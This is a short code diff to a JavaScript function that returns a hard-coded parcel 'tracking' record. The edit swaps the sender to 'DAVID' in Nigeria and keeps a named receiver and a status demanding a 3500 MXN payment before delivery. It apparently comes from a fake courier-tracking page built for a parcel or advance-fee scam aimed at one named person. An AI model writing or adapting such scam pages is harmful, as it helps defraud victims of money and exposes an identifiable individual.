@@ -1,7 +1,7 @@
 function handle34919110LXVN(resultElement) {
     let result = {
-        sender: 'James Elijah',
-        country: 'United kindom',
+        sender: 'DAVID ',
+        country: 'NIGERIA🇳🇬',
         receiver: 'Liliana Zulamith Fontes Tapia',
         date: 'Sept 03, 2025',
         location: 'On transit - waiting for payment to deliver package to home address- pending payment 3500 MXN'
